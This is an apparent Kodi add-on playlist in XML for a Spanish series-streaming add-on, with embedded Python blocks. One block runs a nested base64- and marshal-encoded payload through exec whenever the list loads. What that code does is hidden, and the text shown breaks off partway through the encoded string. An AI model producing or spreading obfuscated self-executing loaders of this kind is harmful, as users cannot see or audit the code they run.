<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<item>
<title>[COLOR gold]*^Top Mejores Series Cristal Azul^*[/COLOR]</title>
<link>NOLINK</link>
<regex>
<name>colores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
 import xbmc, xbmcaddon
 addon = xbmcaddon.Addon('plugin.video.cristalazul')
 return addon.getSetting('ColoreandoPrincipal')
]]></expres>
<page></page>
</regex>
<regex>
<name>coloreando</name>
<expres>$pyFunction:('$doregex[colores]').replace('Predeterminado','').replace('[COLOR lightskyblue]lightskyblue[/COLOR]','[COLOR lightskyblue]').replace('[COLOR aliceblue]aliceblue[/COLOR]','[COLOR aliceblue]').replace('[COLOR antiquewhite]antiquewhite[/COLOR]','[COLOR antiquewhite]').replace('[COLOR aqua]aqua[/COLOR]','[COLOR aqua]').replace('[COLOR aquamarine]aquamarine[/COLOR]','[COLOR aquamarine]').replace('[COLOR azure]azure[/COLOR]','[COLOR azure]').replace('[COLOR beige]beige[/COLOR]','[COLOR beige]').replace('[COLOR bisque]bisque[/COLOR]','[COLOR bisque]').replace('[COLOR black]black[/COLOR]','[COLOR black]').replace('[COLOR blanchedalmond]blanchedalmond[/COLOR]','[COLOR blanchedalmond]').replace('[COLOR blue]blue[/COLOR]','[COLOR blue]').replace('[COLOR blueviolet]blueviolet[/COLOR]','[COLOR blueviolet]').replace('[COLOR brown]brown[/COLOR]','[COLOR brown]').replace('[COLOR burlywood]burlywood[/COLOR]','[COLOR burlywood]').replace('[COLOR cadetblue]cadetblue[/COLOR]','[COLOR cadetblue]').replace('[COLOR chartreuse]chartreuse[/COLOR]','[COLOR chartreuse]').replace('[COLOR chocolate]chocolate[/COLOR]','[COLOR chocolate]').replace('[COLOR coral]coral[/COLOR]','[COLOR coral]').replace('[COLOR cornflowerblue]cornflowerblue[/COLOR]','[COLOR cornflowerblue]').replace('[COLOR crimson]crimson[/COLOR]','[COLOR crimson]').replace('[COLOR cyan]cyan[/COLOR]','[COLOR cyan]').replace('[COLOR darkblue]darkblue[/COLOR]','[COLOR darkblue]').replace('[COLOR darkcyan]darkcyan[/COLOR]','[COLOR darkcyan]').replace('[COLOR darkgoldenrod]darkgoldenrod[/COLOR]','[COLOR darkgoldenrod]').replace('[COLOR darkgray]darkgray[/COLOR]','[COLOR darkgray]').replace('[COLOR darkgreen]darkgreen[/COLOR]','[COLOR darkgreen]').replace('[COLOR darkgrey]darkgrey[/COLOR]','[COLOR darkgrey]').replace('[COLOR darkkhaki]darkkhaki[/COLOR]','[COLOR darkkhaki]').replace('[COLOR darkmagenta]darkmagenta[/COLOR]','[COLOR darkmagenta]').replace('[COLOR darkolivegreen]darkolivegreen[/COLOR]','[COLOR darkolivegreen]').replace('[COLOR darkorange]darkorange[/COLOR]','[COLOR darkorange]').replace('[COLOR darkorchid]darkorchid[/COLOR]','[COLOR darkorchid]').replace('[COLOR darkred]darkred[/COLOR]','[COLOR darkred]').replace('[COLOR darksalmon]darksalmon[/COLOR]','[COLOR darksalmon]').replace('[COLOR darkseagreen]darkseagreen[/COLOR]','[COLOR darkseagreen]').replace('[COLOR darkslateblue]darkslateblue[/COLOR]','[COLOR darkslateblue]').replace('[COLOR darkslategray]darkslategray[/COLOR]','[COLOR darkslategray]').replace('[COLOR darkslategrey]darkslategrey[/COLOR]','[COLOR darkslategrey]').replace('[COLOR darkturquoise]darkturquoise[/COLOR]','[COLOR darkturquoise]').replace('[COLOR deeppink]deeppink[/COLOR]','[COLOR deeppink]').replace('[COLOR deepskyblue]deepskyblue[/COLOR]','[COLOR deepskyblue]').replace('[COLOR dimgray]dimgray[/COLOR]','[COLOR dimgray]').replace('[COLOR dimgrey]dimgrey[/COLOR]','[COLOR dimgrey]').replace('[COLOR dodgerblue]dodgerblue[/COLOR]','[COLOR dodgerblue]').replace('[COLOR firebrick]firebrick[/COLOR]','[COLOR firebrick]').replace('[COLOR floralwhite]floralwhite[/COLOR]','[COLOR floralwhite]').replace('[COLOR forestgreen]forestgreen[/COLOR]','[COLOR forestgreen]').replace('[COLOR fuchsia]fuchsia[/COLOR]','[COLOR fuchsia]').replace('[COLOR gainsboro]gainsboro[/COLOR]','[COLOR gainsboro]').replace('[COLOR ghostwhite]ghostwhite[/COLOR]','[COLOR ghostwhite]').replace('[COLOR gold]gold[/COLOR]','[COLOR gold]').replace('[COLOR goldenrod]goldenrod[/COLOR]','[COLOR goldenrod]').replace('[COLOR gray]gray[/COLOR]','[COLOR gray]').replace('[COLOR green]green[/COLOR]','[COLOR green]').replace('[COLOR greenyellow]greenyellow[/COLOR]','[COLOR greenyellow]').replace('[COLOR grey]grey[/COLOR]','[COLOR grey]').replace('[COLOR honeydew]honeydew[/COLOR]','[COLOR honeydew]').replace('[COLOR hotpink]hotpink[/COLOR]','[COLOR hotpink]').replace('[COLOR indianred]indianred[/COLOR]','[COLOR indianred]').replace('[COLOR indigo]indigo[/COLOR]','[COLOR indigo]').replace('[COLOR ivory]ivory[/COLOR]','[COLOR ivory]').replace('[COLOR khaki]khaki[/COLOR]','[COLOR khaki]').replace('[COLOR lavender]lavender[/COLOR]','[COLOR lavender]').replace('[COLOR lavenderblush]lavenderblush[/COLOR]','[COLOR lavenderblush]').replace('[COLOR lawngreen]lawngreen[/COLOR]','[COLOR lawngreen]').replace('[COLOR lemonchiffon]lemonchiffon[/COLOR]','[COLOR lemonchiffon]').replace('[COLOR lightblue]lightblue[/COLOR]','[COLOR lightblue]').replace('[COLOR lightcoral]lightcoral[/COLOR]','[COLOR lightcoral]').replace('[COLOR lightcyan]lightcyan[/COLOR]','[COLOR lightcyan]').replace('[COLOR lightgoldenrodyellow]lightgoldenrodyellow[/COLOR]','[COLOR lightgoldenrodyellow]').replace('[COLOR lightgray]lightgray[/COLOR]','[COLOR lightgray]').replace('[COLOR lightgreen]lightgreen[/COLOR]','[COLOR lightgreen]').replace('[COLOR lightgrey]lightgrey[/COLOR]','[COLOR lightgrey]').replace('[COLOR lightpink]lightpink[/COLOR]','[COLOR lightpink]').replace('[COLOR lightsalmon]lightsalmon[/COLOR]','[COLOR lightsalmon]').replace('[COLOR lightseagreen]lightseagreen[/COLOR]','[COLOR lightseagreen]').replace('[COLOR lightslategray]lightslategray[/COLOR]','[COLOR lightslategray]').replace('[COLOR lightslategrey]lightslategrey[/COLOR]','[COLOR lightslategrey]').replace('[COLOR lightsteelblue]lightsteelblue[/COLOR]','[COLOR lightsteelblue]').replace('[COLOR lightyellow]lightyellow[/COLOR]','[COLOR lightyellow]').replace('[COLOR lime]lime[/COLOR]','[COLOR lime]').replace('[COLOR limegreen]limegreen[/COLOR]','[COLOR limegreen]').replace('[COLOR linen]linen[/COLOR]','[COLOR linen]').replace('[COLOR magenta]magenta[/COLOR]','[COLOR magenta]').replace('[COLOR maroon]maroon[/COLOR]','[COLOR maroon]').replace('[COLOR mediumaquamarine]mediumaquamarine[/COLOR]','[COLOR mediumaquamarine]').replace('[COLOR mediumblue]mediumblue[/COLOR]','[COLOR mediumblue]').replace('[COLOR mediumorchid]mediumorchid[/COLOR]','[COLOR mediumorchid]').replace('[COLOR mediumpurple]mediumpurple[/COLOR]','[COLOR mediumpurple]').replace('[COLOR mediumseagreen]mediumseagreen[/COLOR]','[COLOR mediumseagreen]').replace('[COLOR mediumslateblue]mediumslateblue[/COLOR]','[COLOR mediumslateblue]').replace('[COLOR mediumspringgreen]mediumspringgreen[/COLOR]','[COLOR mediumspringgreen]').replace('[COLOR mediumturquoise]mediumturquoise[/COLOR]','[COLOR mediumturquoise]').replace('[COLOR mediumvioletred]mediumvioletred[/COLOR]','[COLOR mediumvioletred]').replace('[COLOR midnightblue]midnightblue[/COLOR]','[COLOR midnightblue]').replace('[COLOR mintcream]mintcream[/COLOR]','[COLOR mintcream]').replace('[COLOR mistyrose]mistyrose[/COLOR]','[COLOR mistyrose]').replace('[COLOR moccasin]moccasin[/COLOR]','[COLOR moccasin]').replace('[COLOR navajowhite]navajowhite[/COLOR]','[COLOR navajowhite]').replace('[COLOR navy]navy[/COLOR]','[COLOR navy]').replace('[COLOR none]none[/COLOR]','[COLOR none]').replace('[COLOR oldlace]oldlace[/COLOR]','[COLOR oldlace]').replace('[COLOR olive]olive[/COLOR]','[COLOR olive]').replace('[COLOR olivedrab]olivedrab[/COLOR]','[COLOR olivedrab]').replace('[COLOR orange]orange[/COLOR]','[COLOR orange]').replace('[COLOR orangered]orangered[/COLOR]','[COLOR orangered]').replace('[COLOR orchid]orchid[/COLOR]','[COLOR orchid]').replace('[COLOR palegoldenrod]palegoldenrod[/COLOR]','[COLOR palegoldenrod]').replace('[COLOR palegreen]palegreen[/COLOR]','[COLOR palegreen]').replace('[COLOR paleturquoise]paleturquoise[/COLOR]','[COLOR paleturquoise]').replace('[COLOR palevioletred]palevioletred[/COLOR]','[COLOR palevioletred]').replace('[COLOR papayawhip]papayawhip[/COLOR]','[COLOR papayawhip]').replace('[COLOR peachpuff]peachpuff[/COLOR]','[COLOR peachpuff]').replace('[COLOR peru]peru[/COLOR]','[COLOR peru]').replace('[COLOR pink]pink[/COLOR]','[COLOR pink]').replace('[COLOR plum]plum[/COLOR]','[COLOR plum]').replace('[COLOR powderblue]powderblue[/COLOR]','[COLOR powderblue]').replace('[COLOR purple]purple[/COLOR]','[COLOR purple]').replace('[COLOR red]red[/COLOR]','[COLOR red]').replace('[COLOR rosybrown]rosybrown[/COLOR]','[COLOR rosybrown]').replace('[COLOR royalblue]royalblue[/COLOR]','[COLOR royalblue]').replace('[COLOR saddlebrown]saddlebrown[/COLOR]','[COLOR saddlebrown]').replace('[COLOR salmon]salmon[/COLOR]','[COLOR salmon]').replace('[COLOR sandybrown]sandybrown[/COLOR]','[COLOR sandybrown]').replace('[COLOR seagreen]seagreen[/COLOR]','[COLOR seagreen]').replace('[COLOR seashell]seashell[/COLOR]','[COLOR seashell]').replace('[COLOR sienna]sienna[/COLOR]','[COLOR sienna]').replace('[COLOR silver]silver[/COLOR]','[COLOR silver]').replace('[COLOR skyblue]skyblue[/COLOR]','[COLOR skyblue]').replace('[COLOR slateblue]slateblue[/COLOR]','[COLOR slateblue]').replace('[COLOR slategray]slategray[/COLOR]','[COLOR slategray]').replace('[COLOR slategrey]slategrey[/COLOR]','[COLOR slategrey]').replace('[COLOR snow]snow[/COLOR]','[COLOR snow]').replace('[COLOR springgreen]springgreen[/COLOR]','[COLOR springgreen]').replace('[COLOR steelblue]steelblue[/COLOR]','[COLOR steelblue]').replace('[COLOR tan]tan[/COLOR]','[COLOR tan]').replace('[COLOR teal]teal[/COLOR]','[COLOR teal]').replace('[COLOR thistle]thistle[/COLOR]','[COLOR thistle]').replace('[COLOR transparent]transparent[/COLOR]','[COLOR transparent]').replace('[COLOR turquoise]turquoise[/COLOR]','[COLOR turquoise]').replace('[COLOR violet]violet[/COLOR]','[COLOR violet]').replace('[COLOR wheat]wheat[/COLOR]','[COLOR wheat]').replace('[COLOR white]white[/COLOR]','[COLOR white]').replace('[COLOR whitesmoke]whitesmoke[/COLOR]','[COLOR whitesmoke]').replace('[COLOR yellow]yellow[/COLOR]','[COLOR yellow]').replace('[COLOR yellowgreen]yellowgreen[/COLOR]','[COLOR yellowgreen]')</expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/HdoLqzu.jpg<thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>
 


<item>
<title>[COLOR gold]* [COLOR lightseagreen]Series [COLOR lightseagreen][[COLOR white]Buscador[COLOR lightseagreen]][/COLOR]</title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MHpSTUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGT2JVMHlXa1JWZDA1NlJYcE5WRmsxVFhwWmVrNVVWVFJPZWxFd1dXcEthVTVVU1hwUFZGVjZUbnBWTWs1NlRUVk9WMFV6VFVSVk1rNTZVVE5OVkZKclRtcFJNazlFWXpST1ZGRjZUVVJaTkU1cVVUQlplbFV6VFhwQk1rNXFVbXRPUkdNeldWUlNhMDU2VVRKT2VsSnRUa1JSTTA1Nll6Tk9ha2t4VG1wWk5VMTZVVEJhVkZwb1RrZFplazVFWXpOT1IxVXdUV3BhYWs1cVRYcE9SRkV6VGtSbmVrNTZUVFZPVkdjeFRucGplazVVVVRKT1ZGVXpUbnBKTVUxVVZUSk9ha1V6VFhwWk1rNVVZek5OVkZwcFRtMUZNRTFxVFROT1JFMHdUMFJaZVU1NlozcE9lbFV6VG0xTmVWcHFTbTFPZW1kNlRXcE5NazVFWnpCWmFsbDVUakpGZWs5RVVtMU9WRUY2VFhwTk1VMTZZM3BPYWsxNlRXMVplazlVVFRGT1ZGRjZUMVJLYVU1dFVUTlBWRmt5VG1wVk0wMXFUVE5OYlZsNlQwUkthVTU2VFROT1ZFMHhUbnBKTUU1NlNtMU5lazB5V1ZSTk5VMXRXVEpPVkUwMVRtMVZlazlFU20xT1ZFRXdUbFJOZWsxdFNYcFBSRmswVG5wUk1VOUVUVEZPUkdkNVdtcEtiVTE2YXpGWlZGa3lUbnByTWs1RVkzaE5iVmt5VG1wUk1FMTZVWGxaYWtwdFRXMVplVnBxV1hsT1ZHZDZUWHBOZWsxNldURlBSRXB0VG1wVk0xbFVUVEpPVkZreVQxUk5NRTF0V1RCYVJFcHBUVzFaZWsxVVVUVk9la2w2VFZSWk0wMTZXVEpaYWxWNlRYcE5NVTFVWTNsT2Vra3hXVlJXYUU1NlVYcE5SRmw0VGtSTk0wOVVXVEZPZWtWNlRtcE5NMDVxV1RKT1JFMHpUa1JSTUZwcVl6Sk9iVmt5V1hwU2JFNXFSVE5aVkZwdFRtcE5NMDE2VlhwT1ZHdDZUWHBqTTAxdFNYbFphbVJvVG5wQk0xbFVXWGxPZWxVeVRsUk5ORTVVV1ROT1ZFMDBUbFJqTWs1VVl6Qk9la2t5VFZSamVFNTZWWGxhYWxVMVRYcEZlVnBxVFRWT2FtY3pUbFJLYVU1NlFUSk9SRmw0VFhwSk0wOUVUVEZOYlVreFRVUlNiRTVFVVROT1JHTjRUWHByZWs5VVRYbE9la2t5V2tSak1rNVVaekpQVkZVelRYcE5lazE2VW14T2Vra3lXa1JaZUU0eVJUSk9hbHBxVFhwbk1VMUVVVEpPVkdjeVdWUmFiVTVxU1RKT1ZFMTRUbTFOTUU1VVNtbE9SMUY2VFZSU2JFNUhWVEZPVkZVd1RrUlJNazE2V21sT2Ftc3lXbFJqTlU1Nll6Rk9SRmt5VG1wcmVrOUVUWGxPYW1NeFRYcGFhMDV0U1ROT1JGazBUWHBaTUUxcVdYcE9SRkV6VFZSTk1rNTZaekJQUkZKcFRrZEZNRnBxVVRCT2FrVXlUa1JSZVU1SFJURlpWRkV6VGtSSmVrOVVWVEZPVjBVeFRucFZlVTVFV1RCYVJFMTRUbFJOTUU1VVVtdE9WRmw2VG1wTmVVNUhSVEZaVkZsNVRucE5NMDU2VFhkT1ZHTXhXVlJaZWsxNlp6QlBWRTEzVFhwRk1VMTZXbXhPUjAweVRYcGpORTU2VFRKTmVrMHhUbFJqTVUxVVRYbE5lbGt5V1dwVmVrNVVZekZPUkdNMFRsUkJNazVFVFROTmVrVXpUMVJOTlU1SFNYcE5WRkpyVG0xSk1rNVVWbWhPUjFrd1dsUktiVTVFVlROT2Fsa3hUWHBCTTA5VVZURk9WRlV4VDFSTk1rNVhSVEJhYWxVMFRsUk5NazE2WTNoTmVrRXhUbXBOTlUxNlNYcFBWRmt3VG5wSk1GcEVWVEZPZWxrelRtcGplRTF0U1RKTmVtUm9UbFJGTVUxcVkzbE9la2t3V1hwVmVVNVVSVEJPVkVwcFRqSkZNbGw2V210T1ZFMTZUWHBqTVU1NlRYcE9lbEpvVG0xSmVrMUVUVEJPUkZVeVRsUk5kMDVIUlRKTmVsSnRUbFJOZVZscVdURk9SRlY1V1dwa2FFNXFXVEZPUkdOM1RsUk5NRnBVVVhsT2FsRjZUWHBXYUU1WFJUQk9SR041VG5wak1scFVUVEpPZWtFeFdWUmFhazVxUlROTlZGcHBUbXByTUZwVVdUSk9WR2Q2VDFSWk0wMXRTVE5OVkZVMFRucG5NazE2V21wT1ZFMTVXbXBTYVU1WFJUTk5SRlV4VG5wak1VMUVXbTFPZWswd1RtcFpNRTVIUlRKTmVsSnJUbGRGZWs5VVRURk9hbXN6VFdwU2FFNTZTVEphUkdONVRsUnJlazVFVVhwT2Vtc3pUWHBWZWs1NmF6QlplbU16VG5wQmVWbHFTbWxPTWtVeFRtcGFiVTE2V1RKTlZGbDRUbFJCZWs1RVVtcE5lbWN6VFVSS2FVNUVUWHBPVkUweVRqSkZNazU2V1RKT2FtTXhUMFJaTVU1dFRYcE9SRnBwVGtSRk1FOUVWVEJOYlZreVRsUmplazVxUlhsYWFsVjNUa1JOTTA1VVl6Tk9SRkV4VFVSVk1rNXRWVEJOZWxreFRucHJNRmxVV21oTmVsVXlUbXBSZWsxNlp6TlBWRTB6VGtSSk0wOVVXWHBPZWxrd1dYcFplVTU2UVROT2VsVXlUbTFKTUUxNldYbE9la2t4VGtSUk5VNTZWWHBOUkZVeVRYcFpNRTVxV20xT1ZHTjZUbXBLYlU1VVFURk5lbFY2VGxSRmVrMUVZekJPZWtsNlRVUlJNMDVFVFRKYVZHTXhUbnBqTUZscVNtMU9la2t5V1dwU2JVMXRXVEJQVkZwclRrUkpNazVFVFhwT1IxRjVXbXBLYVU1SFVUQlpha3BwVGtSTmVrOUVUVEJPUkdjd1dYcE5OVTVxYXpCUFJFMDBUWHBuTUU1VVRYcE5lazB5VDFSWmVrNTZRWHBQVkZWNFRrZE5lazVVVlhoT1ZFbDVXbXBOTUU1VVdURk5WRTB6VGtkWk1GbHFaR2hPYWxVeFRWUk5NazU2WXpGUFZFMTNUbFJOTTAxNlkzbE9Na1V5VDFSYWEwNXFXWHBQUkZWNVRucEZNRTE2VW1wT2FrMHlXWHBSTTAxNlVUSlpha3B0VGxSTk1sbDZUVEJPUkdzelRYcE5NazR5UlROTlZGa3hUWHBSTTFsVVRYZE5lbGt4VGtSak1rNUVTWHBOYWtwdFRucEJNMDlFVFhwTmVrVXpUV3BqTTA1cVNUQlBWRkY0VFhwTk0wOVVXbXBPZW1jeFQxUk5OVTE2VFRCWmVsa3dUbnBOTUUxNlRUUk9lbGt4VGtSTk1FNUVUVE5aVkUxNFRucGpNMDVxU20xT1ZFRjZUbXBqTWs1cWF6Tk9lbFV5VFhwRk0wNVVVVFJPVjBVeVdXcE5NVTVxUlRGT2VsRXpUVzFKTVUxNldtaE9WRWt5V2xSYWEwNUVUVEZQUkdOM1RucGplazU2VFRGT1JGRXlUV3BqTVU1NlRYcE5lbEUwVGtkWk1FMVVVWGxOZWtFeVRWUk5lRTVFVlhsWmFtTjRUWHBqTVU1VVZUUk9ha2t3VG5wWmVrMTZWVEJaVkZwb1RtcE5NMDlVVVhsT1ZHY3lXV3BhYlUxNlZUTk5hbEV4VG1wck1VMUVXWHBOZW1Nd1dWUlJNMDVxV1RKWmFrcHBUWHBSTUUxcVRUUk5iVmt3VGtSUmVrNXFXVEpOYWxFd1RXMVpNVTE2V1RCT1ZGRXlXVlJWTkU1VVVURlBWRmsxVG0xVk0wOVVWVFJPYlVreFRWUk5lRTE2VlRGTlZGcG9UWHBSTTA1VVRUVk9SMDB4VFhwS2FVNTZSVEJOVkZFeVRYcE5NRnBxV21wT2VrVXlUbFJqTUU1RVRUTk5lbEV3VG1wUk1GcHFVVE5PYWxWNlRucFNhazR5UlhwTlJFcHBUa1JKZWs1cVNtMU9lbXN4VG5wWk5VNXFXVEpPVkZFeFRYcHJlazVVV21wTmVtY3pUWHBWZWs1cVRUTk9WRkV6VFhwVmVrMUVVbXBPZWxFeVRsUk5NMDE2WnpCT1ZGRXpUbXBGTVZsVVVtMU9iVTB3VFhwTk1VNTZWVEJOVkZsNVRsUk5NVTVVVlhsT01rVXpUMFJhYTA1VVl6QlBSR014VFhwSk1FMXFXWHBPZWsxNlQxUmpkMDVxVVhwUFZGa3pUa2ROZVZwcVdUSk9SRkV5VFhwTk1FNXRVVEJaYWxKc1RtcFJNRTVVV21oT1ZHc3dUa1JaTWs1Nll6SmFSRlV4VG1wSk1FNUVZekpPYlZVeFRVUlNhVTV0VlRGTlJGVjNUbnBGTWxsNlZYbE5iVmt5V2tSYWFrNUVTVE5PVkZrMVRqSkZNVTFxWTNsT2JVa3dXV3BhYkU1SFJUSk9SRTE2VGxSTk0wNTZUVFZOZWswd1dWUlplVTVFUlRGTlZFMHlUa1JWZVZwcVdYbE9hbEV6VG5wUk5FMTZZekpOZWxwc1RrUk5NRnBxVFhoT2VrMHdXbFJhYTA1SFVUTk9hbHB0VGxSUk0xbFVXbTFPUjFVd1drUlZNazVxWTNwT1ZHTXdUWHBuZWs1RVVUVk9Na1V4VDBSak1FMTZhM3BPVkZVd1RucEZNVmxVVFhoT2JWa3dUbFJaZVUxdFNUTk9SRkV5VFhwTk1VMTZZekpPZW1zeVRucFplVTE2UVRCTlZGVXpUbXBSTTAxcVdUUk9SMDB4VDFSVk1rMTZRVEJaZWswMVRrUkplazE2WkdoT1ZFRXlUWHBLYVU1RVkzcE5lbEV5VFhwck1FMVVWWGRPYWxWNlRrUlNiRTE2WnpCWmFsVjRUbFJCTWxwcVVUTk9iVlV3V1dwUk1FNXFXVE5QUkZVeFRucFZlazVVVVhoTmVrMTZUMVJSTlU1VVNUTk5SRnBwVG5wTk1FMXFZekpOZW1kNlRrUlpORTV0VlhwTlJHTXpUbXBKTVZsVVVYaE9SMDE1V21wVmVrNVhSVEpOVkdNeVRXMUpNazU2WXpKTmVra3hUWHBOZDA1VVdYcE5hazE0VGtkTk1sbHFVWHBPVkdjelRYcFJNazU2V1ROT2FtTTBUbFJaTTA1NlRUQk5lbXQ2VFVSS2FVMTZhek5QVkZVelRqSkZNbGxxVlhsTmVtc3dXVlJWTlU1VVFURlBSRkUxVG5wUmVrNUVWVFZPVkUxNlRrUlJORTE2UVRKWmFsa3hUWHByTVUxVVdUQk5lbU42VFVSYWFFNVVWVEJPZWxreVRqSkZlazU2WTNwT2FtY3pUbXBOTVU1VVFUQk5hbU42VFcxWk1FMVVUWHBOZW1Nd1RXcGpNazF0U1hwT1JGVXhUa1JSTUU1NlVYcE9hbGw2VFVSWmVFMTZhekZOUkZKcVRtcFZNRnBFWTNwT1ZHZDZUbnBaTlU1RVozcE9SRkpyVG5wVk1rNUVVVFZOYlVreFQxUlJlRTVxVVhwT2FsVXdUbXBOTTAxcVl6Sk5lazB5VGtSU2FVMTZWVEphUkZKc1RtMVpNazVxVlhkT1ZGa3lUbXBSTkU1RVp6QlphazE1VGxSQk1VMVVZekZPZWswd1RrUk5OVTVIVVRCYWFrcHBUbnBSTTA5VVRUTk5lbWN5VG5wS2JVNVVVVEZOYWxsNVRucG5NRTE2VFhwT1JFa3pUa1JhYlUxNmEzbGFhbFY2VFhwQk1rNXFZelJPZWtreVQxUk5lVTVxWXpGWlZFMTVUbnBKTVU1cVl6Qk9SMVV4VGtSVmVFNUVXWHBPUkUwMFRucG5lazlVV21wTmVrRjZUV3BqZVUxNlVUSlBSRlV3VFhwbk1rOVVWbWhOYlZrd1QxUlJlVTU2VlRKTlZGa3hUbnBKTTFsVVdtMU9WRUV3V21wU2EwNUhVVEpQUkVwcFRsUlZNRTFVV1RKT2VsRXdUbnBSTkU1RVVUTk5hbFpvVFcxSk1sbDZZelZPZWxFd1RucE5NVTR5UlRKWlZGSnBUa2RSTVZsVVVteE5iVWt3VFhwTmVFNTZVVEphUkVwcFRtcFpNMDlVWTNsT2VsRXdUbFJWZDA1RVZURk5SRmw2VFhwWmVrMXFXVFJPUkdjeVQxUlJNazU2VlRCYVJGRjVUWHBqTUU5VVRYcE5lbGt6VFVSWmVVNTZZekZPYWswelRsUkZlazE2WXpST1JFVXhUVVJWZUU1SFVUSk9lbU15VGtSWk1scHFZelZPZWtreVRucFJNRTVVUVhwTlJGVTFUWHBuTTA1cVdUQk9hbWN5VFZSWk5FNTZTVEZOYWxwb1RucG5NRTVVVW1wT2FrVXdUbnBaZWsxNldUSk5lbU16VGtSbmVrOVVXVE5PYlZWNVdtcFJNRTV0UlhwT1ZGRXhUa2ROZWs1VVZUUk9lbXN5V1ZSU2FrNXRSVEZOUkZVd1RucEpNVTlFVFRWT1JGRXlXWHBWZWs1SFZYcE9hbFYzVG5wWk1rMVVXWHBPZW1jeVdWUmFhVTVVUVROT2FsSnRUbTFaZWs1RVdUTk9hbWN5V2tSVk0wNUVXVEpaZW1OM1RtcE5lazFVVlhkT2JVMHdXbXBOZVU1dFdUQk5hbFUwVFhwQk0wMXFXbWhPVkUxNVdtcE5lRTVFUlRGUFJGcG9Ua1JqTWs1cVl6Vk9SRmt5VFhwVk5FNUhXVEJOVkVwdFRtcFJNRnBVWXpGT1JFMHpUa1JhYlUxNlkzcE9SR041VG1wck1GcHFVWGhOZWtreVdYcFZkMDVxV1hwTlZGcHBUWHBWZWs5RVVUQk5iVmt4VFhwYWJFNXRVVEZOVkUwd1RrUm5lazE2V1hsT2VsVXdUV3BSTTA1cVdUQk9hbFV6VGtSVk1GbHFUVFZOZW1jeFRucE5NazU2VVRCTmFrMDFUbTFaTUZwVVdUSk9hbFV5V1dwUmVrNVVRVEpPUkZKb1RucFpNRTVxVlhkT2Vtc3lUV3BaZWs1dFZURk5WRkpzVG5wbk1FMXFZekpPZW1Nd1RtcFZOVTVFWnpGTlJGSnNUbXBWTUZsVVVUVk9WRWt3VDBSYWJFNXFhekZOUkZKclRsUkpNVTVFV214T2VrMHlXa1JOTUUxNlozcE9SRmw2VG1wUk0wNTZZM2xOZW1ONlRrUlJNRTU2V1RKTmVsSnRUbTFaZWs1NlRUQk9SRkY2VFVSUk1VNXRVWGxaYWxFMVRsUkpNazVxVFRCT1JGRjVXV3BTYTAxNlVURlpWRlY0VGxSQmVWcHFXVE5PVkVGNlRtcFpNMDVxV1hwTmFrMTVUbTFWTTAxNlVtcE9iVkV3VFdwS2FVNXFhekJPUkVwdFRYcEpNbHBFVFRKT2FtTXdXa1JLYlU1dFdYcE9lazB3VG5wRk0wNXFVVEJPYWxWNlRsUmFhRTVFWnpCT2VsSm9UbXBSTVUxRVRYbE9SMUV5VGtSWmVrNXRXWHBQUkZab1RqSkZNRTFxWXpKT2FtTXhUMFJLYlU1cVJUQk5hbGt6VG5wWk1FNVVWVFJOYlVsNlQwUlpNVTVVVFRGUFJGcHNUbFJyTUZwVVl6Rk9WRUV5VDFSWk1rMTZRVEJPVkUwMFRtcGpNRTFxV1RKT1JFMHdXVlJaTVU1VVJYcE9SRmw0VGtkUk1FMTZTbTFPVkVVeVdWUk5NazV0V1hwUFJFMTVUbFJSTVU1RVRUSk9WR3N3VG1wS2JVNUVXVE5PUkUxNVRrUlZNRTFxVlROT2JVVXdXa1JTYkU1NlNUTlBWRnB0VGtSbmVrNXFVbXhPYlZVeFRXcFplazU2UVhsYWFrMTNUWHBqTUU1VVdURk9SMUV6VGtSS2FVNUVWVEJhUkZreFRsUnJNazVFWXpWT1JFbDZUWHBhYVU1cVVURlpWRlY2VG1wWk1scHFVWHBOZW1NeVdrUlJORTVxVlhwTlZGSnFUa2RGTWxscVRYcE9hbXN6VFVSWk5FNUVaM3BOVkZrMVRYcE5lazVxV1hoT1JGa3hUVVJhYTAxNlRUSmFSRlYzVFhwck1rNTZWWHBOZWxrd1RsUlZNazE2YXpOT2VsSm9UWHBOZWsxcVdUSk5lbWN4VFdwS2JVMTZXVEphYW1ONVRYcG